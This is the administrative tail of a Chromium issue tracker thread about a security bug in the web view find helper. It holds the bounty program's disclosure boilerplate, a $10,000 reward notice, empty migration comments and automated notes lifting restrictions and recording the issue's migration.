[modify] https://crrev.com/ea1cd76358e00e30e48c2fbf6dc2d324b7012949/extensions/browser/guest_view/web_view/web_view_find_helper.cc


### am...@google.com (2023-05-25)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-05-25)

Congratulations, asnine! The VRP Panel has decided to award you $10,000 for this report of a mildly mitigated security bug. Thank you for your efforts and reporting this issue to us -- nice work! 

### am...@chromium.org (2023-05-25)

[Empty comment from Monorail migration]

### am...@google.com (2023-05-27)

[Empty comment from Monorail migration]

### am...@google.com (2023-05-30)

[Empty comment from Monorail migration]

### pg...@google.com (2023-05-30)

[Empty comment from Monorail migration]

### [Deleted User] (2023-08-23)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1443401?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40064425)*
